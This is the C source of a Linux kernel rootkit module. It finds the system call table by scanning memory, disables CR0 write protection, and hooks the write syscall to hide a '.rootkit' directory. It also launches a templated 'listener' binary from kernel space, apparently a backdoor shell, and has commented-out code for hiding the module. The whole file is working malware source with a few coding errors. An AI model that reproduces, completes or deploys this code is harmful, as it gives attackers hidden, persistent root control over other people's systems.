#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

#define SHELL "SHELL_TEMPLATE"
#define CLEANUP "CLEAN_TEMPLATE"

static int start_listener(void){
	char *argv[] = { SHELL, NULL, NULL };
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int kill_listener(void){
	char *argv[] = { CLEANUP, NULL, NULL };
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}


asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);

 psize *sys_call_table;
 psize **find(void) {
 psize **sctable;
 psize i = START_CHECK;
 while (i < END_CHECK) {
  sctable = (psize **) i;
  if (sctable[__NR_close] == (psize *) sys_close) {
   return &sctable[0];
  }
  i += sizeof(void *);
 }
 return NULL;
}

asmlinkage ssize_t rootkit_write(int fd, const char __user *buff, ssize_t count) {
 int r;
 //hide rootkit directory
 char *proc_protect = ".rootkit";
 char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
 copy_from_user(kbuff,buff,255);
 if (strstr(kbuff,proc_protect)) {
  kfree(kbuff);
  return EEXIST;
 }
 r = (*o_write)(fd,buff,count);
 kfree(kbuff);
 return r;
}



static int rootkit_init(void) {
 /* Do kernel module hiding*/
 //list_del_init(&__this_module.list);
 //kobject_del(&THIS_MODULE->mkobj.kobj);
 
 /* Find the sys_call_table address in kernel memory */
 if ((sys_call_table = (psize *) find())) {
  printk("rootkit: sys_call_table found at %p\n", sys_call_table);
 } else {
  printk("rootkit: sys_call_table not found, aborting\n");
 }
 
 /*//run_shell_commands();
 char ** argv = {
		"/bin/bash",
		"-c",
		"/usr/bin/mkdir",
		"test"
	};

	char ** envp = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
		NULL
	};*/

 //call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

 /* disable write protect on page in cr0 */
 write_cr0(read_cr0() & (~ 0x10000));
 
 /* hijack functions */
 o_write = (void *) xchg(&sys_call_table[__NR_write],rootkit_write);
 
 /* return sys_call_table to WP */
 write_cr0(read_cr0() | 0x10000);

 return start_listener();
}

static void rootkit_exit(void) {
 write_cr0(read_cr0() & (~ 0x10000));
 xchg(&sys_call_table[__NR_write],o_write);
 write_cr0(read_cr0() | 0x10000);
 printk("rootkit: Module unloaded\n");
 return kill_listener();
}

module_init(rootkit_init);
module_exit(rootkit_exit);